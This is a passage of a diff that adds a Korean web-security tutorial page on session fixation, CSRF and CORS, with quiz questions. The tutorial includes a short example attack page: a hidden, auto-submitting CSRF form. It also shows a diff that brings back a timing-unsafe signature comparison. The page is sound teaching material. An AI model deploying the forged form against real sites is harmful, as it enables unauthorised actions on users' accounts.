+              <strong>서버가 로그인 전에도 세션을 준다</strong> 장바구니, 최근 본 공연, 로그인 폼의 CSRF 토큰을 담으려고
+              처음 온 방문자에게도 세션을 만들어 주는 서버가 많다. 공격자는 그냥 사이트에 한 번 들어가 정식으로 발급된 X를
+              받는다. X는 서버 DB에 행이 있는 유효한 토큰이고, 아직 "누구인지 모름" 상태일 뿐이다.
+            </li>
+            <li>
+              <strong>서버가 브라우저가 보낸 처음 보는 값도 받아 준다</strong> 모르는 세션 id가 오면 그 id로 새 세션을
+              만들어 버리는 서버다. 예전 PHP 기본 설정이 이렇게 동작했다. 이때는 공격자가 X를 지어내도 된다.
+            </li>
+          </ol>
+          <p>
+            어느 쪽이든 핵심은 같다. 서버가 로그인 성공 때 토큰은 그대로 두고 그 토큰이 가리키는 행의 내용만 바꾼다는 것이다.
+          </p>
+          <div class="pipe">
+            <div class="pipe-row">
+              <span class="pipe-label">허술한 서버: 같은 토큰 X의 행 내용만 바뀐다</span>
+              <span class="pipe-val secret">X<small>user: 없음 (로그인 전)</small></span>
+              <span class="pipe-fn">피해자가 로그인</span>
+              <span class="pipe-val bad">X<small>user: 피해자</small></span>
+              <span class="pipe-note">공격자도 X를 안다</span>
+            </div>
+            <div class="pipe-row">
+              <span class="pipe-label">이 프로젝트: 새 토큰 Y가 생긴다</span>
+              <span class="pipe-val secret">X<small>있어도 피해자와 무관</small></span>
+              <span class="pipe-fn green">피해자가 로그인</span>
+              <span class="pipe-val ok">Y<small>user: 피해자</small></span>
+              <span class="pipe-note">Y는 피해자 브라우저만 안다</span>
+            </div>
+          </div>
+          <p>아래 순서도는 첫 번째 길(로그인 전 세션)로 X를 얻는 경우다.</p>
+          <h3>토큰을 바꾸지 않는 서버에서</h3>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>공격자</li>
+              <li>피해자 브라우저</li>
+              <li>허술한 서버</li>
+            </ol>
+            <ol class="seq-steps">
+              <li data-from="1" data-to="3">사이트 방문</li>
+              <li class="reply" data-from="3" data-to="1">로그인 전 세션 토큰 X <small>서버가 정식으로 발급한 유효한 토큰. 아직 누구인지 모름</small></li>
+              <li class="stop" data-from="1" data-to="2">피해자 브라우저에 X를 심는다 <small>허술한 서브도메인에서 쿠키 굽기, 주소에 세션 id를 넣은 링크</small></li>
+              <li data-from="2" data-to="3">POST 로그인 <small>Cookie: X, 피해자의 이메일과 비밀번호</small></li>
+              <li class="stop" data-at="3">X의 행에 "user: 피해자"를 적는다 <small>토큰은 그대로 X</small></li>
+              <li class="stop" data-from="1" data-to="3">GET /me <small>Cookie: X</small></li>
+              <li class="reply stop" data-from="3" data-to="1">200 피해자 정보</li>
+            </ol>
+          </div>
+          <h3>로그인할 때 늘 새 토큰을 만드는 서버에서</h3>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>공격자</li>
+              <li>피해자 브라우저</li>
+              <li>이 프로젝트 서버</li>
+            </ol>
+            <ol class="seq-steps">
+              <li class="seq-note">공격자가 어떻게든 토큰 X를 피해자 브라우저에 심어 두었다</li>
+              <li data-from="2" data-to="3">POST /auth/sign-in <small>Cookie: X, 피해자의 이메일과 비밀번호</small></li>
+              <li data-at="3">새 토큰 Y를 만들어 저장 <small>X의 행이 있으면 지운다(정리)</small></li>
+              <li class="reply" data-from="3" data-to="2">200 <small>Set-Cookie: Y (X를 덮어쓴다)</small></li>
+              <li data-from="1" data-to="3">GET /me <small>Cookie: X</small></li>
+              <li class="reply stop" data-from="3" data-to="1">401 <small>공격자는 Y를 모른다</small></li>
+            </ol>
+          </div>
+          <div class="callout">
+            <p>
+              막는 법은 간단하다. <strong>로그인에 성공하면 늘 새 토큰을 만든다.</strong> 로그인 전에 누가 어떤 토큰을
+              심었든, 로그인한 사용자를 가리키는 토큰은 공격자가 본 적 없는 새 값이다. 공격을 막는 것은 이 새 토큰이다.
+            </p>
+          </div>
+          <p>
+            이 프로젝트의 <code>SessionManager.issue</code>는 로그인할 때마다 <code>createSessionToken()</code>으로 새 토큰을
+            만든다. 요청에 이전 쿠키가 실려 오면 그 세션 행도 지우는데, 이는 쓰지 않게 된 행을 치우는 정리다. 지우지 않더라도
+            X는 피해자 계정을 가리키지 않으므로 공격은 이미 실패한다. 위의 두 길도 모두 막혀 있다. 이 프로젝트는 로그인 전에는 세션을 만들지 않아 첫 번째 길이 없고, 쿠키는
+            <code>AUTH_SECRET</code>으로 서명되어 있어 공격자가 지어낸 X는 서명 확인에서 거절되므로 두 번째 길도 없다.
+          </p>
+        </section>
+
+        <section id="csrf">
+          <h2>CSRF</h2>
+          <p>
+            <strong>CSRF</strong>(Cross-Site Request Forgery, 사이트 간 요청 위조)는 다른 사이트가 사용자의 브라우저를 시켜
+            로그인된 서비스로 요청을 보내게 하는 공격이다. 브라우저는 요청을 누가 시켰든 그 서비스의 쿠키를 싣기 때문에,
+            서버는 사용자가 직접 보낸 요청으로 착각한다.
+          </p>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>evil.com 페이지</li>
+              <li>사용자 브라우저</li>
+              <li>shop.com 서버</li>
+            </ol>
+            <ol class="seq-steps">
+              <li class="seq-note">사용자는 shop.com에 로그인해 둔 상태로 evil.com을 연다</li>
+              <li data-from="1" data-to="2">숨은 폼을 자동 제출 <small>&lt;form action="https://shop.com/orders" method="POST"&gt;</small></li>
+              <li class="stop" data-from="2" data-to="3">POST /orders <small>shop.com 쿠키가 실려 간다</small></li>
+              <li class="stop" data-at="3">로그인한 사용자의 주문으로 처리</li>
+            </ol>
+          </div>
+          <p>
+            공격자는 응답을 읽지 못한다(<a href="#cors">CORS</a>가 막는다). 하지만 요청이 서버에 닿아 주문, 탈퇴, 비밀번호
+            변경 같은 <strong>상태 변경</strong>이 일어나면 그것으로 충분하다. 그래서 CSRF 방어는 상태를 바꾸는 요청에
+            집중한다.
+          </p>
+          <p>공격 페이지에 실제로 들어가는 코드는 이 정도다. 화면에는 "경품 당첨!"만 보이고 폼은 보이지 않는다.</p>
+          <pre><code class="language-html">&lt;h1&gt;경품 당첨!&lt;/h1&gt;
+&lt;form id="f" action="https://shop.example.com/orders" method="POST" hidden&gt;
+  &lt;input name="showId" value="7"&gt;
+  &lt;input name="seats" value="10"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;</code></pre>
+          <h3>방어가 있으면 같은 공격이 어떻게 되나</h3>
+          <p>
+            <code>SameSite=Lax</code> 쿠키라면 3번 단계에서 브라우저가 쿠키를 빼고 보낸다. 서버는 로그인하지 않은 요청으로
+            보고 거절한다.
+          </p>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>evil.com 페이지</li>
+              <li>사용자 브라우저</li>
+              <li>shop.example.com 서버</li>
+            </ol>
+            <ol class="seq-steps">
+              <li data-from="1" data-to="2">숨은 폼을 자동 제출</li>
+              <li data-at="2">다른 사이트에서 시작된 POST다 <small>SameSite=Lax 쿠키는 싣지 않는다</small></li>
+              <li data-from="2" data-to="3">POST /orders <small>쿠키 없음</small></li>
+              <li class="reply stop" data-from="3" data-to="2">401 <small>로그인하지 않은 요청</small></li>
+            </ol>
+          </div>
+          <p>
+            방어마다 막는 범위가 다르다. ②와 ③이 방어를 여러 개 겹치는 이유와, GET이 상태를 바꾸면 안 되는 이유를 보여 준다.
+          </p>
+          <div class="scenes">
+            <div class="scene danger">
+              <div class="scene-title">① 다른 사이트의 숨은 폼</div>
+              <div class="scene-browser">
+                <div class="scene-url">https://<b>evil.com</b>/gift</div>
+                <div class="scene-page">숨은 폼이 저절로 제출된다</div>
+              </div>
+              <div class="scene-req">폼 POST /orders</div>
+              <div class="scene-server">shop.<b>example.com</b><small>상태를 바꾸는 API</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict">다른 사이트의 POST → <strong>세 방어 모두 막는다</strong></span>
+                <ul class="scene-chips" data-legend="이 공격을 막나">
+                  <li class="yes">SameSite=Lax</li>
+                  <li class="yes">Origin 검사</li>
+                  <li class="yes">JSON만 받기</li>
+                </ul>
+              </div>
+            </div>
+            <div class="scene danger">
+              <div class="scene-title">② 뚫린 서브도메인의 숨은 폼</div>
+              <div class="scene-browser">
+                <div class="scene-url">https://blog.<b>example.com</b>/post/1</div>
+                <div class="scene-page">누군가 올린 글에 숨은 폼이 들어 있다</div>
+              </div>
+              <div class="scene-req">폼 POST /orders</div>
+              <div class="scene-server">shop.<b>example.com</b><small>상태를 바꾸는 API</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict">같은 사이트라 쿠키가 실린다 → <strong>SameSite로는 못 막는다</strong></span>
+                <ul class="scene-chips" data-legend="이 공격을 막나">
+                  <li class="no">SameSite=Lax</li>
+                  <li class="yes">Origin 검사</li>
+                  <li class="yes">JSON만 받기</li>
+                </ul>
+              </div>
+            </div>
+            <div class="scene danger">
+              <div class="scene-title">③ 상태를 바꾸는 GET으로 가는 링크</div>
+              <div class="scene-browser">
+                <div class="scene-url">https://<b>evil.com</b>/gift</div>
+                <div class="scene-page">"경품 받기" 링크를 누른다</div>
+              </div>
+              <div class="scene-req">링크 이동 GET /orders/7/cancel</div>
+              <div class="scene-server">shop.<b>example.com</b><small>GET으로 예매를 취소하는 잘못된 API</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict">최상위 GET 이동이라 쿠키가 실린다 → <strong>세 방어 모두 못 막는다</strong></span>
+                <ul class="scene-chips" data-legend="이 공격을 막나">
+                  <li class="no">SameSite=Lax</li>
+                  <li class="no">Origin 검사</li>
+                  <li class="no">JSON만 받기</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <p>
+            ③에서 <code>Lax</code>는 링크 이동이라 쿠키를 싣고, 브라우저는 GET 이동에 <code>Origin</code> 헤더를 보내지 않으며,
+            GET에는 본문이 없다. 그래서 세 방어가 모두 비켜 간다. 상태를 바꾸는 일은 POST, PUT, DELETE로만 받아야 하는
+            이유다.
+          </p>
+          <p>방어 방법을 표로 정리하면 다음과 같다.</p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr>
+                  <th>방어</th>
+                  <th>원리</th>
+                  <th>한계</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><a href="#samesite"><code>SameSite=Lax</code></a></td>
+                  <td>다른 사이트에서 시작된 POST에는 쿠키를 싣지 않는다</td>
+                  <td>같은 사이트의 다른 서브도메인에서 온 요청은 막지 못한다</td>
+                </tr>
+                <tr>
+                  <td><a href="#origin"><code>Origin</code></a> 검사</td>
+                  <td>서버가 <code>Origin</code> 헤더를 허용 목록과 비교해 모르는 출처의 변경 요청을 거절한다</td>
+                  <td>허용 목록을 정확히 관리해야 한다</td>
+                </tr>
+                <tr>
+                  <td>JSON 본문만 받기</td>
+                  <td>
+                    HTML 폼은 <code>application/json</code>을 보낼 수 없고, 다른 출처의 <code>fetch</code>가 JSON을 보내려면
+                    먼저 사전 요청(preflight)을 거쳐 서버 허락을 받아야 한다
+                  </td>
+                  <td>서버가 다른 형식의 본문도 받아 주면 무너진다</td>
+                </tr>
+                <tr>
+                  <td>CSRF 토큰</td>
+                  <td>서버가 준 무작위 값을 요청마다 함께 보내게 한다. 다른 사이트는 이 값을 알 수 없다</td>
+                  <td>화면과 요청마다 토큰을 주고받는 작업이 든다</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+          <p>여러 방어를 겹쳐 쓰는 것이 보통이다. 하나가 뚫려도 다른 하나가 막는다.</p>
+        </section>
+
+        <section id="cors">
+          <h2>CORS</h2>
+          <p>
+            브라우저는 기본적으로 다른 <a href="#origin">출처</a>의 응답을 페이지 자바스크립트가 읽지 못하게 한다(동일 출처
+            정책). <code>store.example.com</code>의 페이지가 <code>api.example.com</code>에 <code>fetch</code>를 보내면,
+            요청은 가지만 응답을 읽으려는 순간 막힌다.
+          </p>
+          <p>
+            <strong>CORS</strong>(Cross-Origin Resource Sharing)는 서버가 응답 헤더로 "이 출처는 내 응답을 읽어도 된다"고
+            허락하는 방법이다. 막는 것은 브라우저이고, 허락하는 것은 서버다.
+          </p>
+          <h3>허락이 없을 때: 요청은 가고, 응답은 숨긴다</h3>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>store.example.com 페이지</li>
+              <li>브라우저</li>
+              <li>api.example.com</li>
+            </ol>
+            <ol class="seq-steps">
+              <li data-from="1" data-to="2">fetch('https://api.example.com/me')</li>
+              <li data-from="2" data-to="3">GET /me <small>Origin: https://store.example.com</small></li>
+              <li class="reply" data-from="3" data-to="2">200 <small>본문은 있지만 Access-Control-Allow-Origin 헤더가 없다</small></li>
+              <li class="stop" data-at="2">출처가 다르고 허락도 없다 <small>응답을 페이지에 넘기지 않는다</small></li>
+              <li class="reply stop" data-from="2" data-to="1">TypeError: Failed to fetch</li>
+            </ol>
+          </div>
+          <p>이때 개발자 도구 콘솔에는 이런 오류가 찍힌다. 서버는 이미 200으로 응답했다는 점에 주의한다.</p>
+          <pre><code>Access to fetch at 'https://api.example.com/me' from origin 'https://store.example.com'
+has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource.</code></pre>
+          <h3>누가 응답을 읽을 수 있나</h3>
+          <p>
+            서버가 <code>Access-Control-Allow-Origin: https://store.example.com</code>만 허락했다고 하자.
+          </p>
+          <div class="scenes">
+            <div class="scene">
+              <div class="scene-title">① 허락된 출처</div>
+              <div class="scene-browser">
+                <div class="scene-url"><b>https://store.example.com</b></div>
+                <div class="scene-page"><code>fetch(…, { credentials: 'include' })</code></div>
+              </div>
+              <div class="scene-req">GET /me</div>
+              <div class="scene-server">api.example.com<small>허락: store.example.com</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict">출처가 허락 목록에 있다 → <strong>응답을 읽는다</strong></span>
+                <ul class="scene-chips">
+                  <li class="yes">서버에 닿음</li>
+                  <li class="yes">쿠키 실림</li>
+                  <li class="yes">응답 읽음</li>
+                </ul>
+              </div>
+            </div>
+            <div class="scene cross">
+              <div class="scene-title">② 같은 사이트지만 허락되지 않은 출처</div>
+              <div class="scene-browser">
+                <div class="scene-url"><b>https://admin.example.com</b></div>
+                <div class="scene-page"><code>fetch(…, { credentials: 'include' })</code></div>
+              </div>
+              <div class="scene-req">GET /me</div>
+              <div class="scene-server">api.example.com<small>허락: store.example.com</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict">같은 사이트라 쿠키는 실리지만 출처가 다르다 → <strong>응답은 못 읽는다</strong></span>
+                <ul class="scene-chips">
+                  <li class="yes">서버에 닿음</li>
+                  <li class="yes">쿠키 실림</li>
+                  <li class="no">응답 읽음</li>
+                </ul>
+              </div>
+            </div>
+            <div class="scene danger">
+              <div class="scene-title">③ 다른 사이트</div>
+              <div class="scene-browser">
+                <div class="scene-url"><b>https://evil.com</b></div>
+                <div class="scene-page"><code>fetch(…, { credentials: 'include' })</code></div>
+              </div>
+              <div class="scene-req">GET /me</div>
+              <div class="scene-server">api.example.com<small>허락: store.example.com</small></div>
+              <div class="scene-foot">
+                <span class="scene-verdict">요청은 가지만 → <strong>쿠키도 응답도 없다</strong></span>
+                <ul class="scene-chips">
+                  <li class="yes">서버에 닿음</li>
+                  <li class="no">쿠키 실림</li>
+                  <li class="no">응답 읽음</li>
+                </ul>
+              </div>
+            </div>
+          </div>
+          <p>
+            세 장면 모두 요청은 서버에 닿는다. CORS가 정하는 것은 응답을 읽느냐뿐이다. 쿠키가 실리느냐는
+            <code>SameSite</code>가 정한다. 두 규칙이 보는 기준도 다르다. CORS는 <a href="#origin">출처</a>를, SameSite는
+            사이트를 본다. 그래서 ②처럼 쿠키는 실리는데 응답은 못 읽는 경우가 생긴다.
+          </p>
+          <h3>쿠키를 함께 보내려면</h3>
+          <p>
+            <code>fetch(url, { credentials: 'include' })</code>로 쿠키를 실어 보내는 요청은 조건이 더 엄격하다.
+          </p>
+          <ul>
+            <li><code>Access-Control-Allow-Origin</code>에 <code>*</code>를 쓸 수 없고, 정확한 출처를 적어야 한다.</li>
+            <li><code>Access-Control-Allow-Credentials: true</code>가 있어야 한다.</li>
+          </ul>
+          <p>①에서 <code>api.example.com</code>이 두 조건을 채워 보낸 응답 헤더는 이렇다.</p>
+          <pre><code>Access-Control-Allow-Origin: https://store.example.com
+Access-Control-Allow-Credentials: true</code></pre>
+          <h3>사전 요청(preflight)</h3>
+          <p>
+            "단순하지 않은" 요청(예: <code>Content-Type: application/json</code>, <code>PUT</code>/<code>DELETE</code>, 직접
+            만든 헤더)은 브라우저가 본 요청 전에 <code>OPTIONS</code> 요청을 먼저 보내 허락을 묻는다. 서버가 허락하지 않으면
+            본 요청은 아예 보내지 않는다.
+          </p>
+          <div class="seq">
+            <ol class="seq-actors">
+              <li>store.example.com 페이지</li>
+              <li>브라우저</li>
+              <li>api.example.com</li>
+            </ol>
+            <ol class="seq-steps">
+              <li data-from="1" data-to="2">fetch POST, JSON 본문, credentials: 'include'</li>
+              <li data-from="2" data-to="3">OPTIONS /orders <small>Origin, Access-Control-Request-Method: POST</small></li>
+              <li class="reply" data-from="3" data-to="2">204 <small>Allow-Origin: https://store.example.com, Allow-Credentials: true</small></li>
+              <li data-from="2" data-to="3">POST /orders <small>쿠키와 JSON 본문</small></li>
+              <li class="reply" data-from="3" data-to="2">201 <small>같은 CORS 헤더</small></li>
+              <li class="reply" data-from="2" data-to="1">응답을 읽게 해 준다</li>
+            </ol>
+          </div>
+          <div class="callout warn">
+            <p>
+              CORS는 <strong>응답을 읽는 것</strong>을 허락하는 규칙이지, 요청을 막는 방어가 아니다. 폼 제출처럼 사전
+              요청이 없는 단순 요청은 CORS 허락과 상관없이 서버에 닿는다. 그래서 CORS 설정만으로는 <a href="#csrf">CSRF</a>를
+              막지 못한다.
+            </p>
+          </div>
+        </section>
+
+        <section id="check">
+          <h2>점검 문제</h2>
+          <div class="quiz">
+            <p class="quiz-q">1. 아래 쿠키는 <code>store.example.com</code>으로 가는 요청에 실리는가?</p>
+            <p class="quiz-context"><a href="#domain">Domain</a> 절. <code>api.example.com</code>의 응답이 구운 쿠키다.</p>
+            <pre><code>Set-Cookie: sid=abc; Path=/; Secure; HttpOnly; SameSite=Lax</code></pre>
+            <details class="quiz-answer">
+              <summary>답 보기</summary>
+              <div class="fold-body">
+                <p>
+                  실리지 않는다. <code>Domain</code>이 없어 <code>api.example.com</code>에만 가는 호스트 전용 쿠키다.
+                  <code>store.example.com</code>의 서버도 읽어야 한다면 <code>Domain=example.com</code>을 적어야 한다.
+                </p>
+              </div>
+            </details>
+          </div>
+          <div class="quiz">
+            <p class="quiz-q">2. 세션 토큰은 SHA-256 하나로 해시해 저장해도 되는데, 비밀번호는 왜 scrypt 같은 느린 해시가 필요한가?</p>
+            <p class="quiz-context"><a href="#hash">해시 함수</a>의 주의 상자와 <a href="#kdf">느린 해시</a>, <a href="#random">엔트로피</a> 절.</p>
+            <details class="quiz-answer">
+              <summary>답 보기</summary>
+              <div class="fold-body">
+                <p>
+                  해시를 뒤집는 유일한 방법은 후보를 넣어 보는 것이다. 무작위 190비트 토큰은 후보가 너무 많아 아무리 빨리
+                  넣어 봐도 맞힐 수 없다. 사람이 고른 비밀번호는 흔한 후보 몇억 개 안에 있을 때가 많아서, 한 번 넣어
+                  보는 비용을 키워야 버틸 수 있다.
+                </p>
+              </div>
+            </details>
+          </div>
+          <div class="quiz">
+            <p class="quiz-q">3. 서명 비교를 이렇게 바꾸면 어떤 공격에 약해지는가?</p>
+            <p class="quiz-context"><a href="#timing">타이밍 공격</a> 절.</p>
+            <pre><code class="language-diff">-const ok = expected.length === actual.length &amp;&amp; timingSafeEqual(expected, actual);
++const ok = expectedSignature === receivedSignature;</code></pre>
+            <details class="quiz-answer">
+              <summary>답 보기</summary>
+              <div class="fold-body">
+                <p>
+                  타이밍 공격이다. <code>===</code>는 처음 다른 글자에서 멈추므로, 앞쪽 글자가 많이 맞을수록 조금 늦게
+                  끝난다. 공격자가 응답 시간을 많이 재면 맞는 서명을 한 글자씩 알아낼 수 있다.
+                </p>
+              </div>
+            </details>
+          </div>
+          <div class="quiz">
+            <p class="quiz-q">4. API 서버에 CORS를 "<code>https://store.example.com</code>만 허용"으로 설정했다. 이것으로 <code>evil.com</code>의 숨은 폼 POST를 막을 수 있는가?</p>
+            <p class="quiz-context"><a href="#cors">CORS</a>의 주의 상자와 <a href="#csrf">CSRF</a> 절.</p>
+            <details class="quiz-answer">
+              <summary>답 보기</summary>
+              <div class="fold-body">
+                <p>
+                  막지 못한다. 폼 POST는 사전 요청이 없는 단순 요청이라 서버에 그대로 닿는다. CORS는 <code>evil.com</code>이
+                  응답을 읽지 못하게 할 뿐이다. 요청 자체는 <code>SameSite</code> 쿠키, <code>Origin</code> 검사, JSON 본문만
+                  받기, CSRF 토큰 같은 CSRF 방어로 막아야 한다.
+                </p>
+              </div>
+            </details>
+          </div>
+          <div class="quiz">
+            <p class="quiz-q">5. 로그인할 때 기존 세션 행에 사용자 id만 채워 넣는 방식은 어떤 공격에 약한가?</p>
+            <p class="quiz-context"><a href="#session-fixation">세션 고정</a> 절.</p>
+            <details class="quiz-answer">
+              <summary>답 보기</summary>
+              <div class="fold-body">
+                <p>
+                  세션 고정이다. 공격자가 피해자 브라우저에 심어 둔 토큰이 로그인 뒤에도 그대로 유효해져, 그 토큰을 아는
+                  공격자가 피해자로 로그인된다. 로그인에 성공하면 새 토큰을 만들고 이전 토큰은 버려야 한다.
+                </p>
+              </div>
+            </details>
+          </div>
+        </section>
+      </main>
+    </div>
+  </body>
+</html>
